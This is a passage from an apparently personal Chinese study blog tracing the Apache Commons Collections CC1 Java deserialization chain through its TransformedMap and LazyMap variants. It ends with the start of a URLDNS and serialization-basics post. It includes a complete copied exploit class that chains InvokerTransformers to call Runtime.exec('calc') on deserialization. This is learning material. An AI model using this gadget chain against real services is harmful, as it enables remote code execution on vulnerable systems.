class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scala">static <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MapEntry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractMapEntryDecorator</span> </span>&#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">AbstractInputCheckedMapDecorator</span> parent;  <br>  <br>    <span class="hljs-keyword">protected</span> <span class="hljs-type">MapEntry</span>(<span class="hljs-type">Map</span>.<span class="hljs-type">Entry</span> entry, <span class="hljs-type">AbstractInputCheckedMapDecorator</span> parent) &#123;  <br>        <span class="hljs-keyword">super</span>(entry);  <br>        <span class="hljs-keyword">this</span>.parent = parent;  <br>    &#125;  <br>  <br>    public <span class="hljs-type">Object</span> setValue(<span class="hljs-type">Object</span> value) &#123;  <br>        value = <span class="hljs-keyword">this</span>.parent.checkSetValue(value);  <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.entry.setValue(value);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>我们需要触发的就是这里的checkSetValue，但是不知道parent怎么来的，所以直接打个断点在这个构造函数这里。然后查看调用栈的上一层可以发现,是这里调用了MapEntry，并将parent传给了它。所以我们在这里的构造函数再下一个断点。</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scala">static <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EntrySetIterator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractIteratorDecorator</span> </span>&#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">AbstractInputCheckedMapDecorator</span> parent;  <br>  <br>    <span class="hljs-keyword">protected</span> <span class="hljs-type">EntrySetIterator</span>(<span class="hljs-type">Iterator</span> iterator, <span class="hljs-type">AbstractInputCheckedMapDecorator</span> parent) &#123;  <br>        <span class="hljs-keyword">super</span>(iterator);  <br>        <span class="hljs-keyword">this</span>.parent = parent;  <br>    &#125;  <br>  <br>    public <span class="hljs-type">Object</span> next() &#123;  <br>        <span class="hljs-type">Map</span>.<span class="hljs-type">Entry</span> entry = (<span class="hljs-type">Map</span>.<span class="hljs-type">Entry</span>)<span class="hljs-keyword">this</span>.iterator.next();  <br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-type">MapEntry</span>(entry, <span class="hljs-keyword">this</span>.parent);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>这里会来到 AbstractInputCheckedMapDecorator中的另一个内部类，由于方法比较多，这里就只贴一个构造方法。然后仅需往上一层堆栈走。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">protected</span> EntrySet(Set <span class="hljs-keyword">set</span>, AbstractInputCheckedMapDecorator parent) &#123;  <br>    <span class="hljs-keyword">super</span>(<span class="hljs-keyword">set</span>);  <br>    <span class="hljs-keyword">this</span>.parent = parent;  <br>&#125;<br></code></pre></td></tr></table></figure><p>然后就可以跟到这个entrySet，然后上一层就是反序列化的起点了</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> Set entrySet() &#123;  <br>    <span class="hljs-keyword">return</span> (Set)(<span class="hljs-keyword">this</span>.isSetValueChecking() ? new EntrySet(<span class="hljs-keyword">this</span>.map.entrySet(), <span class="hljs-keyword">this</span>) : <span class="hljs-keyword">this</span>.map.entrySet());  <br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以看到<code>Iterator var4 = this.memberValues.entrySet().iterator();  </code>这一句，这一句首先是调用了entrySet，然后再通过它得到的返回值调用iterator。这里的iterator是迭代器，用来遍历数组的，暂时先不去了解，免得给我绕晕了。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> void read<span class="hljs-constructor">Object(ObjectInputStream <span class="hljs-params">var1</span>)</span> throws IOException, ClassNotFoundException &#123;  <br>    var1.default<span class="hljs-constructor">ReadObject()</span>;  <br>    AnnotationType var2 = null;  <br>  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        var2 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationType</span>.</span></span>get<span class="hljs-constructor">Instance(<span class="hljs-params">this</span>.<span class="hljs-params">type</span>)</span>;  <br>    &#125; catch (IllegalArgumentException var9) &#123;  <br>        throw <span class="hljs-keyword">new</span> <span class="hljs-constructor">InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>)</span>;  <br>    &#125;  <br>  <br>    Map var3 = var2.member<span class="hljs-constructor">Types()</span>;  <br>    Iterator var4 = this.memberValues.entry<span class="hljs-constructor">Set()</span>.iterator<span class="hljs-literal">()</span>;  <br>  <br>    <span class="hljs-keyword">while</span>(var4.has<span class="hljs-constructor">Next()</span>) &#123;  <br>        Map.Entry var5 = (Map.Entry)var4.next<span class="hljs-literal">()</span>;  <br>        String var6 = (String)var5.get<span class="hljs-constructor">Key()</span>;  <br>        Class var7 = (Class)var3.get(var6);  <br>        <span class="hljs-keyword">if</span> (var7 != null) &#123;  <br>            Object var8 = var5.get<span class="hljs-constructor">Value()</span>;  <br>            <span class="hljs-keyword">if</span> (!var7.is<span class="hljs-constructor">Instance(<span class="hljs-params">var8</span>)</span><span class="hljs-operator"> &amp;&amp; </span>!(var8 instanceof ExceptionProxy)) &#123;  <br>                var5.set<span class="hljs-constructor">Value((<span class="hljs-params">new</span> AnnotationTypeMismatchExceptionProxy(<span class="hljs-params">var8</span>.<span class="hljs-params">getClass</span>()</span> + <span class="hljs-string">&quot;[&quot;</span> + var8 + <span class="hljs-string">&quot;]&quot;</span>)).set<span class="hljs-constructor">Member((Method)</span>var2.members<span class="hljs-literal">()</span>.get(var6)));  <br>            &#125;  <br>        &#125;  <br>    &#125;  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><p>这里的memberValues就是我们再构造函数中传入的TransFormerMap但是我这里还有不太懂，由于payload中的时对象到对象的映射但是这里构造函数时字符串到对象的映射，很不解这样子可以强转吗。</p><p>然后我们一步步跟进就知道了，从现在这里往上翻，首先时memberValues.entrySet然后向上，这里的entrySet是TransformedMap对象中没有的方法，所以他会去调用它父类中的，也就是AbstractInputCheckedMapDecorator中的。由于我们想要知道的只是parent是怎么来的，所以现在只关注第二个参数就好。可能是由于这个方法的是TransfromedMap，所以我这里调试显示的this是TransfromedMap。将它传入之后，就完成了parent的首次赋值。<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202404121412883.png" alt="image.png"></p><p>上面所说的逻辑完成之后我们又会回到，这个反序列化函数。然后进入next函数，然后就到了EntrySetIterator，这个就是我们刚才赋值parent的那个内部类。这里的next方法会进入我们调试的起点，也就是MapEntry这个内部类，并且将已经初始化了的parent传入，所以这里的parent就锁定成了TransformedMap，而我们需要的也正是TransformedMap中的checkSetValue方法。<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202404121414885.png" alt="image.png"><br>至此，整条Transformed链就走完了，至于最后的serValue的调用本来还有点疑惑传入的参数怎么控制，但是跟进后发现ConstantTransformer中返回的时已经构造好Runtime，并不会去理会这个传入的参数。</p><h2 id="Lazymap"><a href="#Lazymap" class="headerlink" title="Lazymap"></a>Lazymap</h2><p>这里调用链前面是和transformedmap一样的，然后不同的点就在于这里lazymap是通过代理入使用了反序列化类。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//        创建transformerChain  </span><br>        Transformer transformerChain = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ChainedTransformer(<span class="hljs-params">transformers</span>)</span>;  <br>        Map innerMap = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HashMap()</span>;  <br>        <span class="hljs-comment">//获取lazyMap对象  </span><br>        Map outerMap = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>decorate(innerMap, transformerChain);  <br>        <span class="hljs-comment">//通过反射获取AnnotationInvocationHandler  </span><br>        Class clazz = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>)</span>;  <br>        Constructor construct = clazz.get<span class="hljs-constructor">DeclaredConstructor(Class.<span class="hljs-params">class</span>, Map.<span class="hljs-params">class</span>)</span>;  <br>        construct.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;  <br>        InvocationHandler handler = (InvocationHandler) construct.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(Retention.<span class="hljs-params">class</span>, <span class="hljs-params">outerMap</span>)</span>;  <br>  <br>        <span class="hljs-comment">//为AnnotationInvocationHandler创建代理  </span><br>        Map proxyMap = (Map) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(Map.<span class="hljs-params">class</span>.<span class="hljs-params">getClassLoader</span>()</span>, <span class="hljs-keyword">new</span> Class<span class="hljs-literal">[]</span> &#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Map</span>.</span></span><span class="hljs-keyword">class</span>&#125;, handler);  <br>  <br>        Object o = (InvocationHandler) construct.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(Retention.<span class="hljs-params">class</span>, <span class="hljs-params">proxyMap</span>)</span>;  <br>  <br>        serialize(o); <span class="hljs-comment">//定义了一个序列化的方法  </span><br>        unserialize(<span class="hljs-string">&quot;1.bin&quot;</span>); <span class="hljs-comment">//定义了一个反序列化的方法</span><br></code></pre></td></tr></table></figure><p>这里贴一下p神的lazymap链的后半段，这里的代理的作用简而言之就是当外部触发代理对象（这里是AnnotationInvocationHandler）方法时，会自动调用该类中的invoke方法。这里涉及到的时java中动态代理的知识，目前还只是简要的了解了这个概念，后续再深入学习一下。因为这个payload会在中途触发一次，所以我们可以先反序列化之后注释掉除了unserialize的语句然后调试。</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">public</span> <span class="hljs-built_in">Object</span> <span class="hljs-built_in">get</span>(<span class="hljs-built_in">Object</span> <span class="hljs-built_in">key</span>) &#123;  <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">this</span>.<span class="hljs-property">map</span>.<span class="hljs-property">containsKey</span>(<span class="hljs-built_in">key</span>)) &#123;  <br>        <span class="hljs-built_in">Object</span> value = <span class="hljs-variable">this</span>.<span class="hljs-property">factory</span>.<span class="hljs-property">transform</span>(<span class="hljs-built_in">key</span>);  <br>        <span class="hljs-variable">this</span>.<span class="hljs-property">map</span>.<span class="hljs-property">put</span>(<span class="hljs-built_in">key</span>, value);  <br>        <span class="hljs-keyword">return</span> value;  <br>    &#125; <span class="hljs-keyword">else</span> &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">this</span>.<span class="hljs-property">map</span>.<span class="hljs-property">get</span>(<span class="hljs-built_in">key</span>);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>建议将断点下在这里，不知道为什么idea最终也会触发底层的一下方法，从而触发代理。如果断在invoke那里就会弹多次计算机，甚至在调用栈中去查看也会弹。<br><img src="https://raw.githubusercontent.com/guhuihey/IMG/main/img/202404121431896.png" alt="image.png"><br>但是这里调试的时候在readObject方法中代码运行的顺序实在看不懂，<br>然后去网上翻了一下结合payload中最后一句是将代理作为参数构造了一个AnnotationInvocationHandler对象，也就是说我跑第一遍时这里的memberValues是我设置的代理。然后我又重新去看了下动态代理，好像我能理解了，这里是只要代理执行方法，不管它代理的对象中是否有这个方法，都会去执行代理中的invoke。所以就能理解这句代码的含义了。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Object o = (InvocationHandler) construct.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(Retention.<span class="hljs-params">class</span>, <span class="hljs-params">proxyMap</span>)</span>;<br></code></pre></td></tr></table></figure><p>整个lazymap链的流程是：<br>首先通过反射实例化一个AnnotationInvocationHandler对象（这里初始化的对象是transform）并创建它的代理，然后再通过反射实例化一个AnnotationInvocationHandler并将他的memberValues初始化为AnnotationInvocationHandler的代理，也就是在</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Iterator var4 <span class="hljs-operator">=</span> this.memberValues.entrySet().iterator()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>尝试调用entrySet方法时就会触发invoke方法，理论上应该是这样（但是调试堆栈似乎不太对）；可能是我理解有问题，还请知道原因的大佬斧正。<br>触发invoke方法后就可以去调用我们目标的get方法，继而调用Lazymap触发反序列化链。<br>完整代码（抄的）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ghh.ccs;  <br>  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;  <br><span class="hljs-keyword">import</span> java.lang.annotation.Target;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;  <br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonCollections1</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, InvocationTargetException &#123;  <br>  <br>        <span class="hljs-comment">//定义一系列Transformer对象,组成一个变换链  </span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-comment">//返回Runtime.class  </span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),  <br>                <span class="hljs-comment">//通过反射调用getRuntime()方法获取Runtime对象  </span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),  <br>                <span class="hljs-comment">//通过反射调用invoke()方法  </span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br>                <span class="hljs-comment">//通过反射调用exec()方法启动calc  </span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br>  <br>        <span class="hljs-comment">//将多个Transformer对象组合成一个链  </span><br><span class="hljs-comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  </span><br><span class="hljs-comment">//  </span><br><span class="hljs-comment">//        HashMap&lt;Object,Object&gt; hash = new HashMap&lt;&gt;();  </span><br><span class="hljs-comment">//        //给HashMap添加一个键值对  </span><br><span class="hljs-comment">//        hash.put(&quot;value&quot;,&#x27;b&#x27;);  </span><br><span class="hljs-comment">//        //使用chainedTransformer装饰HashMap生成新的Map decorate  </span><br><span class="hljs-comment">//        Map&lt;Object,Object&gt; decorate = TransformedMap.decorate(hash, null, chainedTransformer);  </span><br><span class="hljs-comment">//  </span><br><span class="hljs-comment">//        //通过反射获取AnnotationInvocationHandler类的构造方法  </span><br><span class="hljs-comment">//        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="hljs-comment">//        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="hljs-comment">//        //设置构造方法为可访问的  </span><br><span class="hljs-comment">//        constructor.setAccessible(true);  </span><br><span class="hljs-comment">//        //通过反射调用构造方法,传入Target.class和decorate参数,创建代理对象o  </span><br><span class="hljs-comment">//        Object o = constructor.newInstance(Target.class, decorate);  </span><br>  <br>        <span class="hljs-comment">//创建transformerChain  </span><br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();  <br>        <span class="hljs-comment">//获取lazyMap对象  </span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);  <br>        <span class="hljs-comment">//通过反射获取AnnotationInvocationHandler  </span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">construct</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);  <br>        construct.setAccessible(<span class="hljs-literal">true</span>);  <br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);  <br>  <br>        <span class="hljs-comment">//为AnnotationInvocationHandler创建代理  </span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Map.class&#125;, handler);  <br>  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, proxyMap);  <br>  <br>        serialize(o); <span class="hljs-comment">//定义了一个序列化的方法  </span><br>        unserialize(<span class="hljs-string">&quot;1.bin&quot;</span>); <span class="hljs-comment">//定义了一个反序列化的方法  </span><br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="hljs-string">&quot;1.bin&quot;</span>)));  <br>        out.writeObject(obj);  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(filename)));  <br>        out.readObject();  <br>    &#125;  <br>  <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化学习_URLDNS</title>
    <link href="/2024/04/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0_URLDNS/"/>
    <url>/2024/04/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0_URLDNS/</url>
    
    <content type="html"><![CDATA[<h1 id="反序列化基础"><a href="#反序列化基础" class="headerlink" title="反序列化基础"></a>反序列化基础</h1><p>由于之前并没有接触过java反序列化相关知识，所以在学习的过程中遇到n个不懂得地方。所以在写之前先可能的盲点说一下</p><h2 id="Serializable与Externalizable"><a href="#Serializable与Externalizable" class="headerlink" title="Serializable与Externalizable"></a>Serializable与Externalizable</h2><p>这是java中的两个接口，只有继承了这两个接口中一个才能将对应的类进行序列化操作。<br>其中Serializable这个接口中并没有任何方法，而仅仅代表着继承了这个接口的类可以被序列化操作。<br>而Externalizable则有两个需要实现的方法，分别为</p><ul><li>readExternal：指定如何反序列化对象，即如何从字节流中还原对象的字段值。</li><li>writeExternal：指定哪些字段需要被序列化，而不是自动序列化所有字段。<br>相比起Serializable，这个接口更加灵活，但是在使用时也会更加复杂。而Serializable则是使用起来更加简单且更方便维护。</li></ul><h2 id="readObject-amp-amp-writeObject"><a href="#readObject-amp-amp-writeObject" class="headerlink" title="readObject&amp;&amp;writeObject"></a>readObject&amp;&amp;writeObject</h2><p>这两个方法分别属于ObjectInput&#x2F;OutputStream，通过继承了两个Object类中的接口来实现对应的功能。<br>这两个类是java中用来将对象和字节进行转换操作的类，但是在HashMap这个类中，HashMap实现了自己的readObject和writeObject。<br>一开始我搜索这两个函数时发现他们并不是属于HashMap的方法，所以就把它们理解成其他类或者接口中的函数。但是当我跟进到HashMap中时发现我所在的方法时readObject,这个方法中又调用了readObject直接就给我整蒙了。后面了专门学习了一下这里的继承和实现的关系，其实也就是HashMap为了处理自己的数据重新写了自己的序列化和反序列化的方法。<br>更多相关知识点：<a href="https://zhuanlan.zhihu.com/p/84533476">HashMap_的readObject&amp;&amp;writeObject</a></p><h2 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h2><p>这个过程不就是简单的调用readObject方法然后跳转到HashMap吗？<br>这是我刚开始看的时候的想法，但是事情远没有我想像的那么简单，光是看它读取前两个字节码就花了我不少时间（主要还是俺太菜了）。与php的反序列化不同java并没有将反序列化这个过程直接隐藏实现，更像是留给了开发者很大的操作空间，所以就会让人看起来很迷糊。其实归根结底就是识别对应的字节码，然后根据字节码对应的属性重建对象。<br>这里如果想仔细了解一下java的这些字节码，推荐使用SerializationDumper-master，但是还是建议先自己序列化一个简单的对象，然后观察要不然直接看HashMap的数据太难了。</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-type">STREAM_MAGIC</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">xac</span> <span class="hljs-variable">ed</span><br><span class="hljs-type">STREAM_VERSION</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x00</span> <span class="hljs-number">05</span><br><span class="hljs-variable">Contents</span><br>  <span class="hljs-type">TC_OBJECT</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x73</span><br>    <span class="hljs-type">TC_CLASSDESC</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x72</span><br>      <span class="hljs-variable">className</span><br>        <span class="hljs-built_in">Length</span> <span class="hljs-operator">-</span> <span class="hljs-number">18</span> <span class="hljs-operator">-</span> <span class="hljs-number">0</span><span class="hljs-variable">x00</span> <span class="hljs-number">12</span><br>        <span class="hljs-built_in">Value</span> <span class="hljs-operator">-</span> <span class="hljs-variable">org</span><span class="hljs-operator">.</span><span 